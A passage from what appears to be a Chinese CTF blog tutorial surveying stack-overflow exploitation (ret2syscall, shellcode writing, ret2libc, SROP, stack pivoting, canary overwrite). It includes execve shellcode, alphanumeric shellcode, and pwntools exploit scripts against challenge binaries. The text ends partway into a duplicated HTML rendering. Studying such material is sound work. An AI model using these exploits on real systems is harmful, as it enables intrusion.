直接读取flag文件，也是一种办法。\n\n而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。\n\n在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。\n\n或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。\n\n总的而言，就是选择能够获取到地址的地方写入/bin/sh。\n\n\n\n**例题:**\n\nciscn_s_3\n\n\n\n### ret2shellcode\n\n#### shellcode的书写\n\n一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。\n\n一个简单的shellcode例子:\n\n```c\n// execve(path = '/bin///sh', argv = ['sh'], envp = 0)\npush 0x68\nmov rax, 0x732f2f2f6e69622f\npush rax\nmov rdi, rsp\n// push argument array ['sh\\x00']\n// push b'sh\\x00' \npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi /* 0 */\npush rsi /* null terminate */\npush 8\npop rsi\nadd rsi, rsp\npush rsi /* 'sh\\x00' */\nmov rsi, rsp\nxor edx, edx /* 0 */\n// call execve()\npush SYS_execve /* 0x3b */\npop rax\nsyscall\n```\n\n这里获取`/bin/sh`地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。\n\n不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即`jmp  rax`此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。\n\n同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，`mov`和`syscall`都会遭到限制， 可用指令如下:\n\n```c\n1.数据传送:\npush/pop eax…\npusha/popa\n\n2.算术运算:\ninc/dec eax…\nsub al, 立即数\nsub byte ptr [eax… + 立即数], al dl…\nsub byte ptr [eax… + 立即数], ah dh…\nsub dword ptr [eax… + 立即数], esi edi\nsub word ptr [eax… + 立即数], si di\nsub al dl…, byte ptr [eax… + 立即数]\nsub ah dh…, byte ptr [eax… + 立即数]\nsub esi edi, dword ptr [eax… + 立即数]\nsub si di, word ptr [eax… + 立即数]\n\n3.逻辑运算:\nand al, 立即数\nand dword ptr [eax… + 立即数], esi edi\nand word ptr [eax… + 立即数], si di\nand ah dh…, byte ptr [ecx edx… + 立即数]\nand esi edi, dword ptr [eax… + 立即数]\nand si di, word ptr [eax… + 立即数]\n\nxor al, 立即数\nxor byte ptr [eax… + 立即数], al dl…\nxor byte ptr [eax… + 立即数], ah dh…\nxor dword ptr [eax… + 立即数], esi edi\nxor word ptr [eax… + 立即数], si di\nxor al dl…, byte ptr [eax… + 立即数]\nxor ah dh…, byte ptr [eax… + 立即数]\nxor esi edi, dword ptr [eax… + 立即数]\nxor si di, word ptr [eax… + 立即数]\n\n4.比较指令:\ncmp al, 立即数\ncmp byte ptr [eax… + 立即数], al dl…\ncmp byte ptr [eax… + 立即数], ah dh…\ncmp dword ptr [eax… + 立即数], esi edi\ncmp word ptr [eax… + 立即数], si di\ncmp al dl…, byte ptr [eax… + 立即数]\ncmp ah dh…, byte ptr [eax… + 立即数]\ncmp esi edi, dword ptr [eax… + 立即数]\ncmp si di, word ptr [eax… + 立即数]\n\n5.转移指令:\npush 56h\npop eax\ncmp al, 43h\njnz lable\n\n<=> jmp lable\n\n6.交换al, ah\npush eax\nxor ah, byte ptr [esp] // ah ^= al\nxor byte ptr [esp], ah // al ^= ah\nxor ah, byte ptr [esp] // ah ^= al\npop eax\n\n7.清零:\npush 44h\npop eax\nsub al, 44h ; eax = 0\n\npush esi\npush esp\npop eax\nxor [eax], esi ; esi = 0\n```\n\n一般而言,  我们采用`xor`或者`sub`指令修改shellcode后面的值，构造`0f 05`， 实现syscall。\n\n一个例子(纯字母数字shellcode):\n\n```c\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129\n/* from call rax */\npush rax\npush rax\npop rcx\n\n/* XOR pop rsi, pop rdi, syscall */\npush 0x41413030\npop rax\nxor DWORD PTR [rcx+0x30], eax\n\n/* XOR /bin/sh */\npush 0x34303041\npop rax\nxor DWORD PTR [rcx+0x34], eax\npush 0x41303041\npop rax\nxor DWORD PTR [rcx+0x38], eax\n\n/* rdi = &'/bin/sh' */\npush rcx\npop rax\nxor al, 0x34\npush rax\n\n/* rdx = 0 */\npush 0x30\npop rax\nxor al, 0x30\npush rax\npop rdx\n\npush rax\n\n/* rax = 59 (SYS_execve) */\npush 0x41\npop rax\nxor al, 0x7a\n\n/* pop rsi, pop rdi*/\n/* syscall */ \n.byte 0x6e\n.byte 0x6f\n.byte 0x4e\n.byte 0x44\n\n/* /bin/sh */\n.byte 0x6e\n.byte 0x52\n.byte 0x59\n.byte 0x5a\n.byte 0x6e\n.byte 0x43\n.byte 0x5a\n.byte 0x41\n```\n\n\n\n构造尽可能短的shellcode可能用到的一些指令\n\n```assembly\ncdp  \n%The CDQ instruction copies the sign (bit 31) \n%of the value in the EAX register into every bit \n%position in the EDX register. \n```\n\n\n\n\n\n\n\n#### shellcode生成工具\n\n同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。\n\n#### mprotect()\n\n进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。\n\n这个函数可以修改指定内存段的权限\n\n```\nmprotect:\nint mprotect(void *addr, size_t len, int prot);\naddr 内存起始地址\nlen  修改内存的长度\nprot 内存的权限，7为可读可写可执行\n```\n\n如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode\n\n\n\n### ret2libc\n\n#### leak_libc\n\n对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.\n\n目前而言，我遇到的栈题中leak_libc，有两种方法：\n\n1. partial_overwrite\n   有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。\n2. 通过puts，write等函数，打印`.got`，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本\n\n```python\n# ref:  https://github.com/lieanu/LibcSearcher\n\nfrom LibcSearcher import *\n\n#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型\nobj = LibcSearcher(\"fgets\", 0X7ff39014bd90)\n\nobj.dump(\"system\")        #system 偏移\nobj.dump(\"str_bin_sh\")    #/bin/sh 偏移\nobj.dump(\"__libc_start_main_ret\")    \n\n```\n\n\n\n另一个可以本地部署的实用工具是libc-database\n\n```bash\n$ ./find printf 260 puts f30\narchive-glibc (libc6_2.19-10ubuntu2_i386)\n$ ./dump libc6_2.19-0ubuntu6.6_i386\noffset___libc_start_main_ret = 0x19a83\noffset_system = 0x00040190\noffset_dup2 = 0x000db590\noffset_recv = 0x000ed2d0\noffset_str_bin_sh = 0x160a24\n$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626\nlibc6_2.17-93ubuntu4_i386\n$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0\nlibc6_2.17-93ubuntu4_i386\n$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4\nlibc6_2.17-93ubuntu4_i386\n$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2\nlibc6_2.17-93ubuntu4_i386\n```\n\n\n\n\n\n#### partial_overwrite\n\n##### 前置知识\n\n针对没有泄露的赛题，可以考虑partial_overwrite改写`got`表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。\n\n考虑对于一个`got`表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖`got`为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall\n\n##### 爆破脚本写法\n\n一个爆破脚本模板:\n\n```python\nfrom pwn import *\nimport sys\n\nelf ='./ciscn_s_3'\nremote_add = 'node4.buuoj.cn'\nremote_port = 29554\n\nmain_add = 0x40051d\noff = 0x130\nsystem_add = 0x400517\nrtframe = 0x4004da\nret_add = 0x4004e9\n\ni = 0\n\nwhile i < 20:\n    try:\n        context.log_level = 'debug'\n        context.arch = 'amd64'\n        if sys.argv[1] == 'r':\n            p = remote(remote_add, remote_port, timeout = 1)\n        elif sys.argv[1] == 'd':\n            p = gdb.debug(elf)\n        else:\n            p = process(elf, timeout = 1)\n        payload1 = b'/bin/sh\\0' + cyclic(0x8)\n        payload1+= p64(main_add)\n\n        p.sendline(payload1)\n\n        stack_add = u64(p.recv(0x28)[-8::]) - off\n\n        frame = SigreturnFrame()\n        frame.rax = 0x3b\n        frame.rdi = stack_add\n        frame.rsi = 0\n        frame.rdx = 0\n        frame.rsp = stack_add\n        frame.rip = system_add\n\n        payload = b'/bin/sh\\0' + cyclic(0x8)\n        payload+= p64(rtframe)\n        payload+= p64(system_add)\n        payload+= bytes(frame)\n\n\n        #p.sendline('a')\n        #p.recvuntil('\\0')\n        p.sendline(payload)\n        p.recvuntil('/bin/sh')\n        p.sendline('cat flag')\n        print(p.recvline())\n        \n        p.close()\n    except BaseException as e:\n        p.close()\n\n    off+=0x8\n    i+=1\n\n```\n\n核心模板:\n\n```c\nwhile True:\n    try:\n\t\t// p = process()\n\t\t// pass\n        p.sendline('cat flag')\n        print(p.recvline())\n        p.close()\n    except BaseException as e:\n        p.close()\n    // pass\n\n```\n\n采用grep 获取输出包含flag的行就行\n\n\n\n#### ret2dl_resolve()\n\n延迟绑定会使用_dl_resolve()函数\n\n- _dl_resolve中\n\n  _dl_resolve调用_dl_fixup, _dl_dixup流程：\n\n  1. 通过link_map 获得.dynsym、.dynstr、.rel.plt地址\n  2. 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针\n  3. 通过&(ELF64_Rel)->r_info 和.dynsym取得对应Elf64_Sym指针\n  4. 检查r_info\n  5. 检查&(Elf64_Sym)->st_other\n  6. 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数\n\n综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)\n\n|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |\n| :----------- | :-------------------- | :----------------------------------------------------------- | :--------------------------------------------------- |\n| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |\n| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |\n| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |\n\n\n\n### Tricks\n\n#### stack pivoting\n\n栈迁移技巧， 主要针对可溢出字节较少的情况，通过`leave`此类指令控制rsp\n\n```assembly\n;leave 相当于:\nmov rsp,rbp\npop rbp\n;那么考虑将栈帧中rbp地址改为栈迁移目的地址\n;leave两次之后，就可以将栈转移到目的地址\n;同时要现在目的地址布置好fake_stack\n```\n\n\n\n可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数\n\n\n\n不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:\n\n- 在第一次read读入后将rbp改为要写入的位置\n- ret到read\n- 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n- 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n\n##### example\n\n一个程序反汇编后:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[48]; // [rsp+0h] [rbp-30h] BYREF\n\n  init(argc, argv, envp);\n  puts(\"You can use stackoverflow.\");\n  puts(\"But only overflow a bit more...\");\n  puts(\"And you must print first.\");\n  memset(s, 0, 0x20uLL);\n  write(1, s, 0x30uLL);\n  read(0, s, 0x40uLL);\n  return 0;\n}\n```\n\n这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串\n\n但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行\n\n~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~\n\n**exp**\n\n```python\nfrom pwn import*\n\np = process('./ezrop')\n#p = gdb.debug('./ezrop')\n\nm = u64(p.recv(40)[-8:])\n\npayloads = p64(0x400863) + b'/bin/sh\\0' + p64(0x400600)\n\npayloads += cyclic(0x18)\npayloads += p64(0x601848+0x30) + p64(0x4007d9)\n\np.send(payloads)\n\nsleep(1)\n\npayloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) \npayloads += b'/bin/sh\\0'\npayloads += b'/bin/sh\\0'\npayloads += p64(0x601848-0x8) + p64(0x4007f9)\n\np.send(payloads)\n\np.interactive()\n\n#0x00007f7b3ce92bb0      0x00007f7b3ccf8450\n```\n\n\n\n\n\n#### 栈对齐\n\n栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。\n\n这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump\n\n可以:\n\n```bash\n$ gdb -c core\n```\n\n调试core文件\n\n如果终止指令类似于:\n\n```c\n ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0\n```\n\n说明是栈对齐的原因，小心调整栈帧就行\n\n\n\n#### Stack smash\n\n对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。\n\n在开启cannary 防护的题目中，检测到栈溢出后，会调用 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag\n\n#### SROP\n\n##### 前置知识:\n\n在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。\n\n那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。\n\n同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。\n\n\n\nSROP简要流程:\n\n1. 构造fake_frame\n2. 控制当前rsp指向fake_frame底部\n3. sigreturn调用\n\n\n\nsigFrame结构如下:\n\n```c\n// x64\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\n\n\n##### pwntools.srop\n\npwntools集成了SROP的模块，可以帮助制作fake_frame:\n\n```python\n// 一个简单的例子\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\n```\n\n\n\n#### stack_gaurd\n\n我们都知道canary来自`fs:0x28`， `fs` 实际上指向的是[TCB](http://www.openwall.com/lists/oss-security/2018/02/27/5) ， TCB结构如下\n\n```c\ntypedef struct\n{\n  void *tcb;                /* Pointer to the TCB.  Not necessarily the\n                           thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;                /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;  // not in 32bit\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;\n  uintptr_t pointer_guard;\n  unsigned long int vgetcpu_cache[2];\n  /* Bit 0: X86_FEATURE_1_IBT.\n     Bit 1: X86_FEATURE_1_SHSTK.\n   */\n  unsigned int feature_1;\n  int __glibc_unused1;\n  /* Reservation of some values for the TM ABI.  */\n  void *__private_tm[4];\n  /* GCC split stack support.  */\n  void *__private_ss;\n  /* The lowest address of shadow stack,  */\n  unsigned long long int ssp_base;\n  /* Must be kept even if it is no longer used by glibc since programs,\n     like AddressSanitizer, depend on the size of tcbhead_t.  */\n  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n  void *__padding[8];\n} tcbhead_t;\n```\n\n0x28的偏移实际上是指向的stack_guard\n\n那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择`pthread_self()` 来查看`fs`的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。\n\n```c\npthread_t\npthread_self (void)\n{\n  return (pthread_t) THREAD_SELF;\n}\n```\n\n\n\n在gdb中查看这个地址，发现这个地址实际上在libc的附近。\n\n```shell\np/x (tcbhead_t)*(tcbhead_t *)(pthread_self())\np/x (void*)(pthread_self())\n```\n\n\n\n```shell\npwndbg> vmmap\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n             Start                End Perm     Size Offset File\n    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]\n    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6\n    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6\n    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6\n    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6\n    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6\n    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]\n    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]\n    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]\n    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]\n0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\npwndbg> p/x (void*)(pthread_self())\n$16 = 0x7ffff7fa8680\n```\n\n如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。\n\n\n\n但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程`fs` 寄存器地址的，所以可以通过此来实现覆盖。\n\n\n\n\n\n","slug":"[Pwn]-StackOverflow-Overview","published":1,"updated":"2023-06-20T07:30:02.067Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clj5d1j740001vwij3qhb1ud4","content":"<h3 id=\"杂谈\">杂谈</h3>\n<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p>\n<p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p>\n<p>怎么去看待栈溢出题呢?</p>\n<p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p>\n<p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p>\n<p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p>\n<p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p>\n<p>当拿到一个题目时，首先思考：</p>\n<p>是否有syscall----&gt;ret2syscall</p>\n<p>有可读可写内存空间吗----&gt;ret2shellcode</p>\n<p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p>\n<p>接下来，再分门别类谈:</p>\n<h3 id=\"0x1-ret2syscall\">0x1.ret2syscall</h3>\n<p>因为syscall属于相对简单的，暂且放在前面谈。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">%rax</th>\n<th style=\"text-align:left\">System call</th>\n<th style=\"text-align:left\">%rdi</th>\n<th style=\"text-align:left\">%rsi</th>\n<th style=\"text-align:left\">%rdx</th>\n<th style=\"text-align:left\">%r10</th>\n<th style=\"text-align:left\">%r8</th>\n<th style=\"text-align:left\">%r9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">59</td>\n<td style=\"text-align:left\">sys_execve</td>\n<td style=\"text-align:left\">const char *filename</td>\n<td style=\"text-align:left\">const char *const argv[]</td>\n<td style=\"text-align:left\">const char *const envp[]</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n</tr>\n</tbody>\n</table>\n<p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p>\n<p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p>\n<p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p>\n<p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p>\n<p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p>\n<p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p>\n<p><strong>例题:</strong></p>\n<p>ciscn_s_3</p>\n<h3 id=\"ret2shellcode\">ret2shellcode</h3>\n<h4 id=\"shellcode的书写\">shellcode的书写</h4>\n<p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。</p>\n<p>一个简单的shellcode例子:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class=\"line\">push <span class=\"number\">0x68</span></span><br><span class=\"line\">mov rax, <span class=\"number\">0x732f2f2f6e69622f</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi, rsp</span><br><span class=\"line\"><span class=\"comment\">// push argument array [&#x27;sh\\x00&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">// push b&#x27;sh\\x00&#x27; </span></span><br><span class=\"line\">push <span class=\"number\">0x1010101</span> ^ <span class=\"number\">0x6873</span></span><br><span class=\"line\">xor dword ptr [rsp], <span class=\"number\">0x1010101</span></span><br><span class=\"line\">xor esi, esi <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\">push rsi <span class=\"comment\">/* null terminate */</span></span><br><span class=\"line\">push <span class=\"number\">8</span></span><br><span class=\"line\">pop rsi</span><br><span class=\"line\">add rsi, rsp</span><br><span class=\"line\">push rsi <span class=\"comment\">/* &#x27;sh\\x00&#x27; */</span></span><br><span class=\"line\">mov rsi, rsp</span><br><span class=\"line\">xor edx, edx <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\"><span class=\"comment\">// call execve()</span></span><br><span class=\"line\">push SYS_execve <span class=\"comment\">/* 0x3b */</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p>\n<p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p>\n<p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>数据传送:</span><br><span class=\"line\">push/pop eax…</span><br><span class=\"line\">pusha/popa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>算术运算:</span><br><span class=\"line\">inc/dec eax…</span><br><span class=\"line\">sub al, 立即数</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">sub dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">sub word ptr [eax… + 立即数], si di</span><br><span class=\"line\">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">sub si di, word ptr [eax… + 